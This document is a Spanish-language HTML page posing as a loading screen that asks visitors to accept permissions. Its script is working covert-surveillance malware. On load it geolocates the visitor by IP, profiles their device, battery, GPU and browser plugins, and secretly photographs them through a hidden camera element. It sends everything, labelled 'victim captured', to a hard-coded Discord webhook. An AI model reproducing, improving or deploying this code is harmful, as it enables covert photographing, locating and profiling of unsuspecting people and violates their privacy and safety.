<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: black;
            color: white;
            overflow: hidden; 
        }
        .texto-principal {
            font-size: 2.5em; 
            text-align: center;
            text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.5);
            padding: 20px;
        }
        #video, #canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="texto-principal">
        Acepta los permisos solicitados para acceder.
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1460300721747525755/i2RU06atxXF3l9Bp3Ex-N3wxfC6eoE58k_FVSiQqwnODd7QV4Js4V5XO8s6xr5NRMTy-";

function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
}

async function manejarCamara() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
        });
        
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();

        const fotoData = await new Promise((resolve) => {
            const checkVideo = setInterval(() => {
                if (video.videoWidth > 0) {
                    clearInterval(checkVideo);
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const data = canvas.toDataURL('image/jpeg', 0.8);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(data);
                    }, 2000); // 2 segundos para evitar foto negra
                }
            }, 100);
        });

        const form = new FormData();
        form.append('payload_json', JSON.stringify({ 
            embeds: [{ title: "ðŸ“¸ FOTO CAPTURADA", color: 0x00FF00 }] 
        }));
        form.append('file', dataURLtoBlob(fotoData), 'foto_victima.jpg');
        await fetch(WEBHOOK, { method: 'POST', body: form });

    } catch (err) {
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "âŒ CÃMARA DENEGADA",
                    description: "El usuario ha rechazado el permiso o no tiene cÃ¡mara.",
                    color: 0xFF0000
                }]
            })
        });
    }
}

async function enviarDatosCompletos() {
    // 1. Datos GeogrÃ¡ficos e IP
    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
    
    // 2. Hardware y BaterÃ­a
    const battery = await navigator.getBattery?.() || {};
    const batteryStatus = battery.level ? `${Math.round(battery.level * 100)}% ${battery.charging ? '(Cargando)' : '(Descargando)'}` : 'N/A';
    const uaData = navigator.userAgentData || {};

    // 3. AnÃ¡lisis de GPU (Tu lÃ³gica original)
    let webglInfo = 'No disponible';
    let gpuLevel = 'Desconocida';
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            webglInfo = renderer;
            if (renderer.includes('RTX') || renderer.includes('Geforce')) gpuLevel = 'Alta gama (Gamer)';
            else if (renderer.includes('Intel') || renderer.includes('UHD')) gpuLevel = 'BÃ¡sica (Integrada)';
            else gpuLevel = 'Media';
        }
    } catch(e) {}

    // 4. Nivel de Usuario por Plugins (Tu lÃ³gica original)
    const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Ninguno';
    let userLevel = 'Principiante';
    const savvyPlugins = ['uBlock', 'AdBlock', 'VPN', 'NoScript', 'Bitwarden'];
    if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo / Tech-savvy';

    // 5. Enlace Google Maps
    const gMapsLink = (geo.latitude && geo.longitude) 
        ? `[ðŸ“ Ver en Google Maps](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})` 
        : "Coordenadas no disponibles";

    // 6. ConstrucciÃ³n del Embed (Estilo original mejorado)
    const embed = {
        title: "VÃ­ctima capturada - WebhookDx",
        color: 0x00FF00,
        fields: [
            { name: "ðŸŒ Red e IP", value: `**IP:** ${geo.ip || '?'}\n**ISP:** ${geo.org || '?'}\n**Zona:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
            { name: "ðŸ“ UbicaciÃ³n", value: `${geo.city || '?'}, ${geo.region || '?'}, ${geo.country_name || '?'}\n${gMapsLink}`, inline: false },
            { name: "ðŸ’» Hardware", value: `**SO:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || '?'}GB\n**CPU:** ${navigator.hardwareConcurrency || '?'} nÃºcleos`, inline: true },
            { name: "ðŸ”‹ BaterÃ­a", value: batteryStatus, inline: true },
            { name: "ðŸŽ® GPU", value: `**Modelo:** ${webglInfo}\n**Calidad:** ${gpuLevel}`, inline: false },
            { name: "ðŸ› ï¸ Navegador y Nivel", value: `**Nivel de usuario:** ${userLevel}\n**Pantalla:** ${screen.width}x${screen.height}`, inline: false }
        ],
        footer: { text: `Fecha y hora: ${new Date().toLocaleString()}` }
    };

    // EnvÃ­o inmediato de la info tÃ©cnica
    await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    });
}

// EjecuciÃ³n paralela total
window.onload = () => {
    enviarDatosCompletos(); 
    manejarCamara(); 
};
</script>
</body>
</html>
